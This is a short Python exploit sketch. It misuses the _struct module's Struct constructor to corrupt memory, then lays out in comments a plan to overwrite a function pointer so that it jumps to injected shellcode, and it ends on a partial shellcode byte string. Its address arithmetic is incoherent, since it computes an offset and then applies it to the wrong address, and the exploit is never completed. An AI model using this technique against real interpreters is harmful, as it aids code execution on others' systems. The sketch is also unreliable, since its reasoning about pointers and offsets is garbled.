from _struct import Struct
s = Struct.__new__(Struct)
s.__init__('<I')
s.unpack('\x7f\xff\xff\xff')

# now we have a pointer to the address of our input
# we can also get a pointer to the address of our shellcode
# we can use this to calculate the offset to our shellcode
# then we can overwrite the function pointer with the address of our shellcode
# and when the program calls the function, it will execute our shellcode

# the address of our shellcode is 0x7fffffffe0ac
# the address of our input is 0x7fffffffe0c8
# the address of the function pointer is 0x7fffffffe0b0
# the offset between the function pointer and our shellcode is 0x7fffffffe0b0 - 0x7fffffffe0ac = 0x4
# so we can overwrite the function pointer with the address of our shellcode + 0x4

# now we can build the exploit
# we can use the following shellcode
# \x31\xc0\x48\xbb\xd1\x9d\x96\x91
